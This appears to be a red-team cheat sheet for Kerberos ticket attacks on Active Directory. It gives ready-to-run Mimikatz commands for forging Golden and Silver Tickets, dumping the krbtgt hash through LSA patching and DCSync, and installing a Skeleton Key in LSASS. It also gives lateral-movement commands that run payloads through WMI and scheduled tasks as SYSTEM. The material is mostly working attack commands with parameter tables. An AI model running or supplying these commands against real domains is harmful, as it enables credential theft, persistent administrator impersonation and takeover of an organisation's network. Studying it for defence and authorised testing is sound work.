# Tickets

## Get domain SID

Execute the following command in a domain machine.&#x20;

```
whoami /user
```

The SID is a string formatted as following. We need the string without the RID

```
S-1-5-21-1602875587-2787523311-2599479668 [-1103]
|------------------SID-------------------||--RID--|
```

## Golden Ticket

a valid ticket forged from the Domain Controller KRBTGT hash. Allows an attacker to impersonate any user on any machine even from an host external to the domain.

```
kerberos::golden /domain:<domain> /sid:<sid> /aes256:<aes> /user:<user> /groups:<groups> /ptt
```

Create Golden Ticket as Administrator user and store it in memory

```
kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /krbtgt:<ticket> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

| Parameter                              | Description                                                                                  |
| -------------------------------------- | -------------------------------------------------------------------------------------------- |
| /user                                  | Username                                                                                     |
| /domain                                | FQDN                                                                                         |
| /sid                                   | Domain SID                                                                                   |
| /krbtgt OR /aes128 OR /aes256 OR /ntlm | key to use to generate the ticket                                                            |
| /id                                    | User ID, use 500 for Administrator                                                           |
| /groups                                | Associated groups, accepts multiple separated by a comma. Default is 512,513,520             |
| /startoffset                           | 0 means available from now, positive numbers add a delay in minutes to the ticket activation |
| /endin                                 | Optional ticket lifetime in minutes. Default is 600 (10 hours)                               |
| /renewmax                              | Optional ticket lifetime in minutes. Default is 10080 (7 days)                               |
| /ptt OR /ticket                        | Load the ticket in memory or store it as a file for later use                                |

### Mimikatz info dump

```
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::trust /patch
lsadump::dcsync /user:krbtgt
```

## Silver Ticket

Create a valid TGT ticket from a known NTLM service hash. Allows to gain access to the service machine.

```
kerberos::golden /user:<user> /domain:<domain> /sid:<SID> /rc4:<hash> /id:<id> /groups:<groups> /service:<srv> /target:<host>
```

| Parameter       | Description                                                                                  |
| --------------- | -------------------------------------------------------------------------------------------- |
| /user           | Username                                                                                     |
| /domain         | FQDN                                                                                         |
| /sid            | Domain SID                                                                                   |
| /rc4            | NTLM key                                                                                     |
| /id             | User ID, use 500 for Administrator                                                           |
| /groups         | Associated groups, accepts multiple separated by a comma. Default is 512,513,520             |
| /startoffset    | 0 means available from now, positive numbers add a delay in minutes to the ticket activation |
| /endin          | Optional ticket lifetime in minutes. Default is 600 (10 hours)                               |
| /renewmax       | Optional ticket lifetime in minutes. Default is 10080 (7 days)                               |
| /service        | Type of service to attack. See table below for reference.                                    |
| /target         | The target host                                                                              |
| /ptt OR /ticket | Load the ticket in memory or store it as a file for later use                                |

### List of service attacks

In case of multiple tickets, the attacker has to create a new silver ticket for the same target host for each specified service type. The following attacks are run from the Windows machine where oyu have created the ticket

| Service                             | Silver Tickets service types required          |
| ----------------------------------- | ---------------------------------------------- |
| WMI                                 | HOST, RPCSS                                    |
| PowerShell Remoting                 | HOST, HTTP, WSMAN or RPCSS depending on the OS |
| WinRM                               | HOST, HTTP                                     |
| Task Scheduler                      | HOST                                           |
| LDAP                                | LDAP                                           |
| Windows File Share                  | CIFS                                           |
| Windows Remote Administration Tools | RPCSS, LDAP, CIFS                              |
| MSSQL                               | MSSQL                                          |

#### WMI

```
wmic.exe /authority:"kerberos:<domain>\<DC>" /node:"<target>" process call create "<payload>"
```

#### PowerShell remoting / WinRM

```
New-PSSESSION -NAME PSC -ComputerName <target>; Enter-PSSession -Name PSC
```

#### Task Scheduler

```
schtasks /create /s <target> /SC <time> <amount> /RU "NT Authority\System" /IR "<payload>"
schtasks /create /s <target> /SC <time> <amount> /RU "<group>/<user>" /IR "<payload>"
```

The available times are MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE. For the first 5 ones you also have to specify an amount of time, for instance HOURLY 3 means start every 3 hours.

#### Windows File Share

```
dir \\<target>\c$
```

#### LDAP Desync attack

```
lsadump::dcsync /dc:<DC> /domain:<domain> /user:krbtgt
```

#### MSSQL

```
sqlcmd.exe -S <hostname>
```

## Skeleton Key

Patches the LSASS Domain Controller process to allow access for a determined user with an arbitrary password specified by the attacker. After the attack both the new password and the original one are considered valid. The default injected password is mimikatz.

```
misc::skeleton
```
